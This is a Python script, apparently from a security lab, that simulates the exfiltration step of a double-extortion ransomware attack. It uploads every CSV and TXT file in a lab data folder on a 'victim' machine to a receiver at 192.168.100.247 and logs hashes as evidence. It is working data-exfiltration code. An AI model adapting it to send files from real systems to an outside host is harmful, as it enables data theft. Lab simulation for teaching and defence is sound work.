#!/usr/bin/env python3

from pathlib import Path
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
from urllib.parse import quote
from datetime import datetime, timezone
import hashlib
import json

# Chỉ lấy dữ liệu trong thư mục lab đã tạo
DATA_DIR = Path.home() / "lab" / "data"

# Địa chỉ Debian Receiver
RECEIVER_URL = "http://192.168.100.247:8000/upload"

# Lưu log phía Victim
EVIDENCE_DIR = Path.home() / "lab" / "evidence"
CLIENT_LOG = EVIDENCE_DIR / "client_upload.log"

MAX_FILE_SIZE = 5 * 1024 * 1024


def sha256(data):
    return hashlib.sha256(data).hexdigest()


def main():
    if not DATA_DIR.is_dir():
        print(f"[ERROR] Data directory not found: {DATA_DIR}")
        return

    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)

    files = sorted(
        path for path in DATA_DIR.rglob("*")
        if path.is_file() and path.suffix.lower() in {".csv", ".txt"}
    )

    if not files:
        print("[ERROR] No CSV/TXT files found.")
        return

    print("Double Extortion Lab - Exfiltration Simulation")
    print(f"Source: {DATA_DIR}")
    print(f"Destination: {RECEIVER_URL}")
    print(f"Files found: {len(files)}")
    print("-" * 60)

    successful = 0

    for file_path in files:
        relative_path = file_path.relative_to(DATA_DIR).as_posix()

        # Đọc file nằm trong thư mục lab
        data = file_path.read_bytes()

        if len(data) > MAX_FILE_SIZE:
            print(f"[SKIPPED] {relative_path}: exceeds size limit")
            continue

        file_hash = sha256(data)

        request = Request(
            RECEIVER_URL,
            data=data,
            headers={
                "Content-Type": "application/octet-stream",
                "X-Relative-Path": quote(relative_path, safe="/")
            },
            method="POST"
        )

        try:
            with urlopen(request, timeout=10) as response:
                result = json.loads(response.read().decode("utf-8"))

            record = {
                "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                "destination": RECEIVER_URL,
                "relative_path": relative_path,
                "size_bytes": len(data),
                "sha256": file_hash,
                "receiver_status": result.get("status")
            }

            with CLIENT_LOG.open("a", encoding="utf-8") as log:
                log.write(json.dumps(record, ensure_ascii=False) + "\n")

            if result.get("status") == "received" and result.get("sha256") == file_hash:
                print(f"[OK] {relative_path}")
                print(f"     Size: {len(data)} bytes")
                print(f"     SHA256: {file_hash}")
                successful += 1
            else:
                print(f"[WARNING] Receiver response mismatch: {relative_path}")

        except HTTPError as error:
            print(f"[HTTP ERROR] {relative_path}: {error.code} {error.reason}")

        except URLError as error:
            print(f"[CONNECTION ERROR] {relative_path}: {error.reason}")

        except TimeoutError:
            print(f"[TIMEOUT] {relative_path}")

    print("-" * 60)
    print(f"Transfer completed: {successful}/{len(files)} files")
    print(f"Client log: {CLIENT_LOG}")


if __name__ == "__main__":
    main()
